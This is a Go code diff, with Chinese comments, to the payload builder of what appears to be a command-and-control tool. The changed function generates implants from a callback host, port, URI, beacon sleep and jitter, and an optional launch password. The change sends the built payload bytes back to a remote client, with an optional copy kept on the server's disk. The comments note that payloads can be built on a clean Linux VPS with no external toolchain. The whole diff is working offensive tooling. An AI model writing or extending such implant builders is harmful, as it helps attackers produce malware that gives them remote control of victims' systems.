@@ -54,19 +54,25 @@ func makeTokenGate(password string) (salt, hash string, err error) {
 	return salt, hash, nil
 }
 
-// buildPayloadNative 用内置模板生成载荷并落盘。返回可读日志。
+// buildPayloadNative 用内置模板生成载荷。
+//
+// 返回 (日志, 产物字节, 错误)。**产物以字节形式回传给调用方**, 由调用方决定怎么处置 ——
+// 这是"服务端在远程、客户端要拿到产物"的关键: 服务端不再自顾自写自己的磁盘就完事。
+//
+// outFile 非空时**额外**在服务端本地也存一份 (服务端与客户端同机时方便直接取用);
+// 传空则只在内存里生成并回传。
 //
 // 全程不调用任何外部进程 —— 这是让服务端能在没有 PowerShell / MinGW 的机器上
 // (例如一台干净的 Linux VPS) 生成载荷的关键。
 func buildPayloadNative(format, host string, port int, ssl bool, uri string,
-	sleepMS, jitter int, xform, password, outFile, devRoot string) (string, error) {
+	sleepMS, jitter int, xform, password, outFile, devRoot string) (string, []byte, error) {
 
 	var sb strings.Builder
 	sb.WriteString("[*] 内置生成器 (无需外部工具链)\n")
 
 	salt, hash, err := makeTokenGate(password)
 	if err != nil {
-		return sb.String(), err
+		return sb.String(), nil, err
 	}
 
 	cfg := PayloadCfg{
@@ -83,38 +89,35 @@ func buildPayloadNative(format, host string, port int, ssl bool, uri string,
 
 	blob, err := BuildPayloadNative(format, cfg)
 	if err != nil {
-		return sb.String(), err
-	}
-
-	// 输出路径: 调用方给了就用, 否则按 payload2_<格式>_<地址>_<端口>.<ext> 落到 build/payload/
-	if outFile == "" {
-		dir := filepath.Join(devRoot, "build", "payload")
-		if err := os.MkdirAll(dir, 0o755); err != nil {
-			return sb.String(), fmt.Errorf("创建输出目录失败: %v", err)
-		}
-		outFile = filepath.Join(dir, fmt.Sprintf("payload2_%s_%s_%d%s",
-			format, host, port, extOf(format)))
-	} else {
-		if err := os.MkdirAll(filepath.Dir(outFile), 0o755); err != nil {
-			return sb.String(), fmt.Errorf("创建输出目录失败: %v", err)
-		}
-	}
-
-	if err := os.WriteFile(outFile, blob, 0o644); err != nil {
-		return sb.String(), fmt.Errorf("写产物失败: %v", err)
+		return sb.String(), nil, err
 	}
 
 	sb.WriteString(fmt.Sprintf("    格式   : %s\n", format))
 	sb.WriteString(fmt.Sprintf("    回连   : %s%s:%d%s\n", schemeOf(ssl), host, port, uri))
 	sb.WriteString(fmt.Sprintf("    心跳   : %d ms, 抖动 %d%%\n", sleepMS, jitter))
-	sb.WriteString(fmt.Sprintf("    输出   : %s (%d 字节)\n", outFile, len(blob)))
 	if hash != "" {
 		sb.WriteString("    门控   : 已启用启动口令 (明文不回显)\n")
 	} else {
 		sb.WriteString("    门控   : 未启用 (直接运行)\n")
 	}
+
+	// 服务端本地留一份 (可选)。注意: 路径是**服务端**的文件系统路径,
+	// 服务端在远程时这个路径指的是那台机器的磁盘, 与客户端无关 ——
+	// 客户端要拿到产物请用响应里回传的字节。
+	if outFile != "" {
+		if err := os.MkdirAll(filepath.Dir(outFile), 0o755); err != nil {
+			sb.WriteString(fmt.Sprintf("    [!] 服务端本地留档失败 (不影响回传): 建目录 %v\n", err))
+		} else if err := os.WriteFile(outFile, blob, 0o644); err != nil {
+			sb.WriteString(fmt.Sprintf("    [!] 服务端本地留档失败 (不影响回传): 写文件 %v\n", err))
+		} else {
+			sb.WriteString(fmt.Sprintf("    服务端留档: %s\n", outFile))
+		}
+	}
+
+	sum := sha256.Sum256(blob)
+	sb.WriteString(fmt.Sprintf("    产物   : %d 字节, sha256 %s\n", len(blob), hex.EncodeToString(sum[:])[:16]))
 	sb.WriteString(fmt.Sprintf("[+] 生成完成 %s\n", time.Now().Format("15:04:05")))
-	return sb.String(), nil
+	return sb.String(), blob, nil
 }
 
 func schemeOf(ssl bool) string {
